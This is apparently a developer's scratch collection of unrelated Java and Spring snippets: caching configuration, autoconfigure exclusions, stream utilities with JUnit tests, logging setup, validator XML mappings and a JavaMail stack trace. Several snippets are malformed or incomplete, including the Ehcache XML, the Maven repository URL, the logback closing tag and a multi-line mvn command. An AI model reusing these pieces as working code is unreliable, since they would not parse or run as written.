@SpringBootTest(classes = TestApplication.class, webEnvironment = WebEnvironment.DEFINED_PORT)
public class ExcludeAutoConfigIntegrationTest {
    // ...
}

---
spring:
  profiles: test
  autoconfigure.exclude: org.springframework.boot.autoconfigure.session.SessionAutoConfiguration
--------------------------------------------------------------------------------------------------------
https://howtodoinjava.com/hibernate/hibernate-ehcache-configuration-tutorial/
https://www.ehcache.org/documentation/2.8/integrations/hibernate.html
https://vladmihalcea.com/how-does-hibernate-collection-cache-work/
https://planet.jboss.org/post/collection_caching_in_the_hibernate_second_level_cache

         /**
* Returns the advanced search facilities that should appear for this country.
* @hibernate.set cascade="all" inverse="true"
* @hibernate.collection-key column="COUNTRY_ID"
* @hibernate.collection-one-to-many class="com.wotif.jaguar.domain.AdvancedSearchFacility"
* @hibernate.cache usage="read-write"
*/
public Set getAdvancedSearchFacilities() {
return advancedSearchFacilities;
"/>


             <?xml version="1.0" encoding="UTF-8"?>
<ehcache>
 <cache name="com.somecompany.someproject.domain.Country"
	maxEntriesLocalHeap="50"
	eternal="false"
	timeToLiveSeconds="600"
    <persistence strategy="localTempSwap"/>
/>
 <cache
name="com.somecompany.someproject.domain.Country.advancedSearchFacilities"
	maxEntriesLocalHeap="450"
	eternal="false"
	timeToLiveSeconds="600"
    <persistence strategy="localTempSwap"/>
/>
</ehcache>
--------------------------------------------------------------------------------------------------------
URI uri = UriComponentsBuilder
        .fromUriString("https://example.com/hotels/{hotel}")
        .queryParam("q", "{q}")
        .encode()
        .buildAndExpand("Westin", "123")
        .toUri();
--------------------------------------------------------------------------------------------------------
@GetMapping("/download")
public StreamingResponseBody handle() {
    return new StreamingResponseBody() {
        @Override
        public void writeTo(OutputStream outputStream) throws IOException {
            // write...
        }
    };
}
--------------------------------------------------------------------------------------------------------
// Target all Controllers annotated with @RestController
@ControllerAdvice(annotations = RestController.class)
public class ExampleAdvice1 {}

// Target all Controllers within specific packages
@ControllerAdvice("org.example.controllers")
public class ExampleAdvice2 {}

// Target all Controllers assignable to specific classes
@ControllerAdvice(assignableTypes = {ControllerInterface.class, AbstractController.class})
public class ExampleAdvice3 {}
--------------------------------------------------------------------------------------------------------
@RestController
public class ErrorController {

    @RequestMapping(path = "/error")
    public Map<String, Object> handle(HttpServletRequest request) {
        Map<String, Object> map = new HashMap<String, Object>();
        map.put("status", request.getAttribute("javax.servlet.error.status_code"));
        map.put("reason", request.getAttribute("javax.servlet.error.message"));
        return map;
    }
}
--------------------------------------------------------------------------------------------------------
  <repositories>
        <repository>
            <id>Nexus</id>
            <name>Maven Central</name>
            <url>HTTPS: https://repo1.maven.org/maven2</url>
        </repository>
        <repository>
            <id>egit</id>
            <name>Eclipse egit</name>
            <url>https://repo.eclipse.org/content/repositories/egit-releases/</url>
        </repository>
    </repositories>
--------------------------------------------------------------------------------------------------------
spring:
  autoconfigure:
    exclude:
      - org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration
--------------------------------------------------------------------------------------------------------
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT, properties="spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.mongo.embedded.EmbeddedMongoAutoConfiguration")
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableCaching
@EnableScheduling
public class CachingConfig {
    public static final String GAMES = "GAMES";
    @Bean
    public CacheManager cacheManager() {
        ConcurrentMapCacheManager cacheManager = new ConcurrentMapCacheManager(GAMES);

        return cacheManager;
    }

@CacheEvict(allEntries = true, value = {GAMES})
@Scheduled(fixedDelay = 10 * 60 * 1000 ,  initialDelay = 500)
public void reportCacheEvict() {
    System.out.println("Flush Cache " + dateFormat.format(new Date()));
}

@Configuration
@EnableCaching
public class CacheConfig {

   public final static String CACHE_ONE = "cacheOne";
   public final static String CACHE_TWO = "cacheTwo";

   @Bean
   public Cache cacheOne() {
      return new GuavaCache(CACHE_ONE, CacheBuilder.newBuilder()
            .expireAfterWrite(60, TimeUnit.MINUTES)
            .build());
   }

   @Bean
   public Cache cacheTwo() {
      return new GuavaCache(CACHE_TWO, CacheBuilder.newBuilder()
            .expireAfterWrite(60, TimeUnit.SECONDS)
            .build());
   }
}
@Service
public class CachedService extends WebServiceGatewaySupport implements CachedService {

    @Inject
    private RestTemplate restTemplate;


    @Cacheable(CacheConfig.CACHE_ONE)
    public String getCached() {

        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON);

        HttpEntity<String> reqEntity = new HttpEntity<>("url", headers);

        ResponseEntity<String> response;

        String url = "url";
        response = restTemplate.exchange(
                url,
                HttpMethod.GET, reqEntity, String.class);

        return response.getBody();
    }
}

@EnableCaching
@Configuration
public class CacheConfiguration implements CachingConfigurer {

    @Override
    public CacheManager cacheManager() {
        ConcurrentMapCacheManager cacheManager = new ConcurrentMapCacheManager() {

            @Override
            protected Cache createConcurrentMapCache(final String name) {
                return new ConcurrentMapCache(name,
                    CacheBuilder.newBuilder().expireAfterWrite(30, TimeUnit.MINUTES).maximumSize(100).build().asMap(), false);
            }
        };

        return cacheManager;
    }

    @Override
    public KeyGenerator keyGenerator() {
        return new DefaultKeyGenerator();
    }

}
--------------------------------------------------------------------------------------------------------
public static <T> Optional<T> last(Stream<? extends T> stream) {
    Objects.requireNonNull(stream, "stream");

    Spliterator<? extends T> spliterator = stream.spliterator();
    Spliterator<? extends T> lastSpliterator = spliterator;

    // Note that this method does not work very well with:
    // unsized parallel streams when used with skip methods.
    // on that cases it will answer Optional.empty.

    // Find the last spliterator with estimate size
    // Meaningfull only on unsized parallel streams
    if(spliterator.estimateSize() == Long.MAX_VALUE) {
        for (Spliterator<? extends T> prev = spliterator.trySplit(); prev != null; prev = spliterator.trySplit()) {
            lastSpliterator = prev;
        }
    }

    // Find the last spliterator on sized streams
    // Meaningfull only on parallel streams (note that unsized was transformed in sized)
    for (Spliterator<? extends T> prev = lastSpliterator.trySplit(); prev != null; prev = lastSpliterator.trySplit()) {
        if (lastSpliterator.estimateSize() == 0) {
            lastSpliterator = prev;
            break;
        }
    }

    // Find the last element of the last spliterator
    // Parallel streams only performs operation on one element
    AtomicReference<T> last = new AtomicReference<>();
    lastSpliterator.forEachRemaining(last::set);

    return Optional.ofNullable(last.get());
}
Unit testing using junit 5:

@Test
@DisplayName("last sequential sized")
void last_sequential_sized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed();
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(9_950_000L);
}

@Test
@DisplayName("last sequential unsized")
void last_sequential_unsized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(9_950_000L);
}

@Test
@DisplayName("last parallel sized")
void last_parallel_sized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(1);
}

@Test
@DisplayName("getLast parallel unsized")
void last_parallel_unsized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(1);
}

@Test
@DisplayName("last parallel unsized with skip")
void last_parallel_unsized_with_skip() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    // Unfortunately unsized parallel streams does not work very well with skip
    //assertThat(Streams.last(stream)).hasValue(expected);
    //assertThat(count).hasValue(1);

    // @Holger implementation gives wrong answer!!
    //assertThat(Streams.getLast(stream)).hasValue(9_950_000L); //!!!
    //assertThat(count).hasValue(1);

    // This is also not a very good answer better
    assertThat(Streams.last(stream)).isEmpty();
    assertThat(count).hasValue(0);
}

public static <T> Optional<T> last(Stream<? extends T> stream) {
    Objects.requireNonNull(stream, "stream");

    Spliterator<? extends T> spliterator = stream.spliterator();

    // Find the last spliterator with estimate size (sized parallel streams)
    if(spliterator.hasCharacteristics(Spliterator.SIZED|Spliterator.SUBSIZED)) {
        // Find the last spliterator on sized streams (parallel streams)
        for (Spliterator<? extends T> prev = spliterator.trySplit(); prev != null; prev = spliterator.trySplit()) {
            if (spliterator.getExactSizeIfKnown() == 0) {
                spliterator = prev;
                break;
            }
        }
    }

    // Find the last element of the spliterator
    //AtomicReference<T> last = new AtomicReference<>();
    //spliterator.forEachRemaining(last::set);

    //return Optional.ofNullable(last.get());

    // A better one that supports native parallel streams
    return (Optional<T>) StreamSupport.stream(spliterator, stream.isParallel())
            .reduce((a, b) -> b);
}



Parallel unsized streams with 'skip' methods are tricky and the @Holger's implementation gives a wrong answer. Also @Holger's implementation is a bit slower because it uses iterators.

An optimisation of @Holger answer:

public static <T> Optional<T> last(Stream<? extends T> stream) {
    Objects.requireNonNull(stream, "stream");

    Spliterator<? extends T> spliterator = stream.spliterator();
    Spliterator<? extends T> lastSpliterator = spliterator;

    // Note that this method does not work very well with:
    // unsized parallel streams when used with skip methods.
    // on that cases it will answer Optional.empty.

    // Find the last spliterator with estimate size
    // Meaningfull only on unsized parallel streams
    if(spliterator.estimateSize() == Long.MAX_VALUE) {
        for (Spliterator<? extends T> prev = spliterator.trySplit(); prev != null; prev = spliterator.trySplit()) {
            lastSpliterator = prev;
        }
    }

    // Find the last spliterator on sized streams
    // Meaningfull only on parallel streams (note that unsized was transformed in sized)
    for (Spliterator<? extends T> prev = lastSpliterator.trySplit(); prev != null; prev = lastSpliterator.trySplit()) {
        if (lastSpliterator.estimateSize() == 0) {
            lastSpliterator = prev;
            break;
        }
    }

    // Find the last element of the last spliterator
    // Parallel streams only performs operation on one element
    AtomicReference<T> last = new AtomicReference<>();
    lastSpliterator.forEachRemaining(last::set);

    return Optional.ofNullable(last.get());
}
Unit testing using junit 5:

@Test
@DisplayName("last sequential sized")
void last_sequential_sized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed();
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(9_950_000L);
}

@Test
@DisplayName("last sequential unsized")
void last_sequential_unsized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(9_950_000L);
}

@Test
@DisplayName("last parallel sized")
void last_parallel_sized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(1);
}

@Test
@DisplayName("getLast parallel unsized")
void last_parallel_unsized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(1);
}

@Test
@DisplayName("last parallel unsized with skip")
void last_parallel_unsized_with_skip() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    // Unfortunately unsized parallel streams does not work very well with skip
    //assertThat(Streams.last(stream)).hasValue(expected);
    //assertThat(count).hasValue(1);

    // @Holger implementation gives wrong answer!!
    //assertThat(Streams.getLast(stream)).hasValue(9_950_000L); //!!!
    //assertThat(count).hasValue(1);

    // This is also not a very good answer better
    assertThat(Streams.last(stream)).isEmpty();
    assertThat(count).hasValue(0);
}
The only solution to support both's scenarios is to avoid detecting the last spliterator on unsized parallel streams. The consequence is that the solution will perform operations on all elements but it will give always the right answer.

Note that in sequential streams, it will anyway perform operations on all elements.

public static <T> Optional<T> last(Stream<? extends T> stream) {
    Objects.requireNonNull(stream, "stream");

    Spliterator<? extends T> spliterator = stream.spliterator();

    // Find the last spliterator with estimate size (sized parallel streams)
    if(spliterator.hasCharacteristics(Spliterator.SIZED|Spliterator.SUBSIZED)) {
        // Find the last spliterator on sized streams (parallel streams)
        for (Spliterator<? extends T> prev = spliterator.trySplit(); prev != null; prev = spliterator.trySplit()) {
            if (spliterator.getExactSizeIfKnown() == 0) {
                spliterator = prev;
                break;
            }
        }
    }

    // Find the last element of the spliterator
    //AtomicReference<T> last = new AtomicReference<>();
    //spliterator.forEachRemaining(last::set);

    //return Optional.ofNullable(last.get());

    // A better one that supports native parallel streams
    return (Optional<T>) StreamSupport.stream(spliterator, stream.isParallel())
            .reduce((a, b) -> b);
}
With regard to the unit testing for that implementation, the first three tests are exactly the same (sequential & sized parallel). The tests for unsized parallel are here:

@Test
@DisplayName("last parallel unsized")
void last_parallel_unsized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(10_000_000L);
}

@Test
@DisplayName("last parallel unsized with skip")
void last_parallel_unsized_with_skip() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(9_950_000L);
}
--------------------------------------------------------------------------------------------------------
System.lineSeparator()
System.getProperty("line.separator")

rhyme = line1 + "&#10;" + line2;
rhyme = line1 + "&#10;&#13;" + line2;
--------------------------------------------------------------------------------------------------------
if(LOGGER.isInfoEnabled()) {
    String message = MessageFormat.format("Bad experience for user {0} at time {1} while accessing {2}", user, Calendar.getInstance().getTime(), application);
    LOGGER.info(message);
}
--------------------------------------------------------------------------------------------------------
  private static Logger LOGGER = null;

  static {
      InputStream stream = MyClass.class.getClassLoader().
              getResourceAsStream("logging.properties");
      try {
          LogManager.getLogManager().readConfiguration(stream);
          LOGGER= Logger.getLogger(MyClass.class.getName());

      } catch (IOException e) {
          e.printStackTrace();
      }
  }
  
  
  
    private static Logger LOGGER = null;

  static {
      System.setProperty("java.util.logging.SimpleFormatter.format",
              "[%1$tF %1$tT] [%4$-7s] %5$s %n");
      LOGGER = Logger.getLogger(MyClass2.class.getName());
  }
  
  
  
    private static Logger LOGGER = null;

  static {
      Logger mainLogger = Logger.getLogger("com.logicbig");
      mainLogger.setUseParentHandlers(false);
      ConsoleHandler handler = new ConsoleHandler();
      handler.setFormatter(new SimpleFormatter() {
          private static final String format = "[%1$tF %1$tT] [%2$-7s] %3$s %n";

          @Override
          public synchronized String format(LogRecord lr) {
              return String.format(format,
                      new Date(lr.getMillis()),
                      lr.getLevel().getLocalizedName(),
                      lr.getMessage()
              );
          }
      });
      mainLogger.addHandler(handler);
      LOGGER = Logger.getLogger(MyClass3.class.getName());
  }
  
  @Import({MailCacheConfiguration.class})
--------------------------------------------------------------------------------------------------------
mvn archetype:create -DarchetypeGroupId=org.hibernate \
                     -DarchetypeArtifactId=hibernate-validator-quickstart-archetype \
                     -DarchetypeVersion=4.1.0.Final \
                     -DgroupId=com.mycompany 
                     -DartifactId=hv-quickstart
--------------------------------------------------------------------------------------------------------
spring:
  redis:
#    sentinel:
#      master: mc2
#      nodes: mc2-redis-1.paragon-software.com:26379,mc2-redis-2.paragon-software.com:26379,mc2-redis-3.paragon-software.com:26379
    host: localhost
    port: 6379
--------------------------------------------------------------------------------------------------------
@Slf4j
@Component
@RequiredArgsConstructor
public class MailingRecoverer implements KafkaRetryRecoverer {

    private final MailingStatusPublisher mailingStatusPublisher;

    @Override
    public void recover(final ConsumerRecord<?, ?> consumerRecord, final Exception e) {
        final Object value = consumerRecord.value();
        if (value instanceof AnonymizedMailMessage) {
            final AnonymizedMailMessage mailMessage = (AnonymizedMailMessage) value;
            final MailingStatus mailingStatus = new MailingStatus();
            mailingStatus.setTaskId(mailMessage.getTaskId());

            final MailingStatus.Status status = new MailingStatus.Status();
            status.setSuccess(false);
            status.setErrorCode(resolveErrorCode(e));
            mailingStatus.setStatus(status);
            this.mailingStatusPublisher.publish(mailingStatus, mailMessage.getResponseType());
        }
        final String message = getOriginalMessage(e);
        log.error("Max failures reached for: {}, message: {}", consumerRecord, message, e);
    }

    private MailingErrorCode resolveErrorCode(final Exception e) {
        String source = null;
        if (e instanceof ServiceUnavailableException) {
            source = ((ServiceUnavailableException) e).getSource();
        } else if (e instanceof ServiceCallException) {
            source = ((ServiceCallException) e).getSource();
        }
        return MailingErrorCode.findByCode(source);
    }

    private String getOriginalMessage(final Exception e) {
        return (e instanceof ListenerExecutionFailedException) ? e.getCause().getMessage() : e.getMessage();
    }
}
--------------------------------------------------------------------------------------------------------
To help you with the logback-spring.xml, import the build-info.properties into logback-spring.xml as shown below. This allows each key in build-info.properties to be accessed using logback place-holders. (DO NOT CONFUSE THIS WITH SPRING PROPERTY PLACEHOLDERS OR SPRING-EXPRESSIONS)

<?xml version="1.0" encoding="UTF-8" ?>
<configuration>
  <springProperty scope="context" name="appLogTarget" source="app.log.target"
    defaultValue="CONSOLE"/>
  <property resource="META-INF/build-info.properties" />


  <appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender">
    <layout class="ch.qos.logback.classic.PatternLayout">
      <Pattern>[${build.version}] %d{ISO8601}" %-5p [%c{3}"] \(%t:%X{}"\) %m%n</Pattern>
    </layout>
  </appender>
 <root>
    <level value="DEBUG"/>
    <appender-ref ref="CONSOLE"/>
  </root>
</xml>
--------------------------------------------------------------------------------------------------------
<constraint-mappings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                     xsi:schemaLocation="http://jboss.org/xml/ns/javax/validation/mapping validation-mapping-1.0.xsd"
                     xmlns="http://jboss.org/xml/ns/javax/validation/mapping">
    <default-package>org.hibernate.validator.quickstart</default-package>
    <bean class="Car" ignore-annotations="true">
        <field name="manufacturer">
            <constraint annotation="javax.validation.constraints.NotNull"/>
        </field>
        <field name="licensePlate">
            <constraint annotation="javax.validation.constraints.NotNull"/>
        </field>
        <field name="seatCount">
            <constraint annotation="javax.validation.constraints.Min">
                <element name="value">2</element>
            </constraint>
        </field>
        <field name="driver">
            <valid/>
        </field>
        <getter name="passedVehicleInspection" ignore-annotations="true">
            <constraint annotation="javax.validation.constraints.AssertTrue">
                <message>The car has to pass the vehicle inspection first</message>
                <groups>
                    <value>CarChecks</value>
                </groups>
                <element name="max">10</element>
            </constraint>
        </getter>
    </bean>
    <bean class="RentalCar" ignore-annotations="true">
        <class ignore-annotations="true">
            <group-sequence>
                <value>RentalCar</value>
                <value>CarChecks</value>
            </group-sequence>
        </class>
    </bean>
    <constraint-definition annotation="org.mycompany.CheckCase" include-existing-validator="false">
        <validated-by include-existing-validators="false">
            <value>org.mycompany.CheckCaseValidator</value>
        </validated-by>
    </constraint-definition>
</constraint-mappings>
--------------------------------------------------------------------------------------------------------
if (spouseIsMale.orElse(false)) {
    System.out.println("There is a male spouse.");
}
filterValue.ifPresentOrElse(value -> {
    if(value){
        method1();
    } else {
        method2();
    }
}, () -> method3());
--------------------------------------------------------------------------------------------------------
 public static void main (String[] args) {
        List<String> list = new ArrayList<>();

        Spliterator<String> s = list.spliterator();

        if(s.hasCharacteristics(Spliterator.ORDERED)){
            System.out.println("ORDERED");
        }
        if(s.hasCharacteristics(Spliterator.DISTINCT)){
            System.out.println("DISTINCT");
        }
        if(s.hasCharacteristics(Spliterator.SORTED)){
            System.out.println("SORTED");
        }
        if(s.hasCharacteristics(Spliterator.SIZED)){
            System.out.println("SIZED");
        }

        if(s.hasCharacteristics(Spliterator.CONCURRENT)){
            System.out.println("CONCURRENT");
        }
        if(s.hasCharacteristics(Spliterator.IMMUTABLE)){
            System.out.println("IMMUTABLE");
        }
        if(s.hasCharacteristics(Spliterator.NONNULL)){
            System.out.println("NONNULL");
        }
        if(s.hasCharacteristics(Spliterator.SUBSIZED)){
            System.out.println("SUBSIZED");
        }
    }
--------------------------------------------------------------------------------------------------------
Stream<Integer> unfolded = StreamUtils.unfold(1, i ->
    (i < 10)
        ? Optional.of(i + 1)
        : Optional.empty());

assertThat(unfolded.collect(Collectors.toList()),
           contains(1, 2, 3, 4, 5, 6, 7, 8, 9, 10));
		   
Stream<String> streamA = Stream.of("A", "B", "C");
Stream<String> streamB  = Stream.of("Apple", "Banana", "Carrot", "Doughnut");

List<String> zipped = StreamUtils.zip(streamA,
                                      streamB,
                                      (a, b) -> a + " is for " + b)
                                 .collect(Collectors.toList());

assertThat(zipped,
           contains("A is for Apple", "B is for Banana", "C is for Carrot"));
		   
Stream<Integer> ints = Stream.of(1,2,3,4,5,6,7,8,9,10);
Stream<Integer> skipped = StreamUtils.skipWhile(ints, i -> i < 4);

List<Integer> collected = skipped.collect(Collectors.toList());

assertThat(collected,
           contains(4, 5, 6, 7, 8, 9, 10));
		   
Stream<Integer> infiniteInts = Stream.iterate(0, i -> i + 1);
Stream<Integer> finiteInts = StreamUtils.takeWhile(infiniteInts, i -> i < 10);

assertThat(finiteInts.collect(Collectors.toList()),
           hasSize(10));
		   

--------------------------------------------------------------------------------------------------------
 public static void main (String[] args) {
     int[] ints = {3,4,6,7};
     Spliterator.OfInt s = Arrays.spliterator(ints);
     s.forEachRemaining((IntConsumer) System.out::println);
 }
--------------------------------------------------------------------------------------------------------
List<Item> operatedList = new ArrayList<>();
itemList.stream()
  .filter(item -> item.isQualified())
  .forEach(item -> {
    item.operate();
    operatedList.add(item);
});
itemList.removeAll(operatedList);
--------------------------------------------------------------------------------------------------------
List<Integer> integers = Lists.mutable.with(1, 2, 3, 4, 5);
int index = Iterate.detectIndex(integers, i -> i > 2);
if (index > -1) {
    integers.remove(index);
}

Assert.assertEquals(Lists.mutable.with(1, 2, 4, 5), integers);
--------------------------------------------------------------------------------------------------------
Map<Boolean, List<String>> classifiedElements = names
    .stream()
    .collect(Collectors.partitioningBy((String e) -> 
      !e.startsWith("A")));
 
String matching = String.join(",",
  classifiedElements.get(true));
String nonMatching = String.join(",",
  classifiedElements.get(false));
--------------------------------------------------------------------------------------------------------
package com.mkyong;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;

public class test {
	public static void main(String[] args){

	try {
		File fileDir = new File("c:\\temp\\test.txt");
			
		BufferedReader in = new BufferedReader(
		   new InputStreamReader(
                      new FileInputStream(fileDir), "UTF8"));
		        
		String str;
		      
		while ((str = in.readLine()) != null) {
		    System.out.println(str);
		}
		        
                in.close();
	    } 
	    catch (UnsupportedEncodingException e) 
	    {
			System.out.println(e.getMessage());
	    } 
	    catch (IOException e) 
	    {
			System.out.println(e.getMessage());
	    }
	    catch (Exception e)
	    {
			System.out.println(e.getMessage());
	    }
	}
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@SpringBootTest(classes = { MyConfigurationPropertiesTest_1.TestConfiguration.class })
@ActiveProfiles("happy-path")
public class MyConfigurationPropertiesTest_1 {
 
    @Autowired
    private MyConfigurationProperties properties;
 
    @Test
    public void should_Populate_MyConfigurationProperties() {
        assertThat(properties.getSomeMandatoryProperty()).isEqualTo("123456");
        assertThat(properties.getSomeOptionalProperty()).isEqualTo("abcdef");
        assertThat(properties.getSomeDefaultProperty()).isEqualTo("overwritten");
    }
 
    @EnableConfigurationProperties(MyConfigurationProperties.class)
    public static class TestConfiguration {
        // nothing
    }
}
 
application-happy-path.yml:
    my:
      properties:
        some_mandatory_property: "123456"
        some_optional_property: "abcdef"
        some_default_property: "overwritten"
--------------------------------------------------------------------------------------------------------
@TestPropertySource(properties={"spring.autoconfigure.exclude=comma.seperated.ClassNames,com.example.FooAutoConfiguration"})
@EnableAutoConfiguration(exclude = IntegrationAutoConfiguration.class)

javax.mail.StoreClosedException: * BYE JavaMail Exception: java.io.IOException: Connection dropped by server?
	at com.sun.mail.imap.IMAPFolder.throwClosedException(IMAPFolder.java:3732)
	at com.sun.mail.imap.IMAPFolder.doCommand(IMAPFolder.java:3866)
	at com.sun.mail.imap.IMAPFolder.exists(IMAPFolder.java:590)
	at org.springframework.integration.mail.AbstractMailReceiver.openFolder(AbstractMailReceiver.java:324)
	at org.springframework.integration.mail.ImapMailReceiver.waitForNewMessages(ImapMailReceiver.java:170)
	at org.springframework.integration.mail.ImapIdleChannelAdapter$IdleTask.run(ImapIdleChannelAdapter.java:289)
	at org.springframework.integration.mail.ImapIdleChannelAdapter$ReceivingTask.run(ImapIdleChannelAdapter.java:254)
	at org.springframework.scheduling.support.DelegatingErrorHandlingRunnable.run(DelegatingErrorHandlingRunnable.java:54)
	at org.springframework.scheduling.concurrent.ReschedulingRunnable.run(ReschedulingRunnable.java:93)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)
	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:180)
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:293)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at java.lang.Thread.run(Thread.java:748)
	
java.lang.IllegalStateException: Failure in 'idle' task. Will resubmit.
	at org.springframework.integration.mail.ImapIdleChannelAdapter$IdleTask.run(ImapIdleChannelAdapter.java:305)
	at org.springframework.integration.mail.ImapIdleChannelAdapter$ReceivingTask.run(ImapIdleChannelAdapter.java:254)
	at org.springframework.scheduling.support.DelegatingErrorHandlingRunnable.run(DelegatingErrorHandlingRunnable.java:54)
	at org.springframework.scheduling.concurrent.ReschedulingRunnable.run(ReschedulingRunnable.java:93)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)
	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:180)
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:293)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at java.lang.Thread.run(Thread.java:748)
Caused by: javax.mail.StoreClosedException: * BYE JavaMail Exception: java.io.IOException: Connection dropped by server?
	at com.sun.mail.imap.IMAPFolder.throwClosedException(IMAPFolder.java:3732)
	at com.sun.mail.imap.IMAPFolder.doCommand(IMAPFolder.java:3866)
	at com.sun.mail.imap.IMAPFolder.exists(IMAPFolder.java:590)
	at org.springframework.integration.mail.AbstractMailReceiver.openFolder(AbstractMailReceiver.java:324)
	at org.springframework.integration.mail.ImapMailReceiver.waitForNewMessages(ImapMailReceiver.java:170)
	at org.springframework.integration.mail.ImapIdleChannelAdapter$IdleTask.run(ImapIdleChannelAdapter.java:289)
	... 10 common frames omitted
--------------------------------------------------------------------------------------------------------
@Configuration
@Profile("dev")
public class StandaloneDataConfig {

	@Bean
	public DataSource dataSource() {
		return new EmbeddedDatabaseBuilder()
			.setType(EmbeddedDatabaseType.HSQL)
			.addScript("classpath:com/bank/config/sql/schema.sql")
			.addScript("classpath:com/bank/config/sql/test-data.sql")
			.build();
	}
}
--------------------------------------------------------------------------------------------------------
package com.example;

@RunWith(SpringJUnit4ClassRunner.class)
// ApplicationContext will be loaded from the static inner ContextConfiguration class
@ContextConfiguration(loader=AnnotationConfigContextLoader.class)
public class OrderServiceTest {

    @Configuration
    static class ContextConfiguration {

        // this bean will be injected into the OrderServiceTest class
        @Bean
        public OrderService orderService() {
            OrderService orderService = new OrderServiceImpl();
            // set properties, etc.
            return orderService;
        }
    }

    @Autowired
    private OrderService orderService;

    @Test
    public void testOrderService() {
        // test the orderService
    }
}
--------------------------------------------------------------------------------------------------------
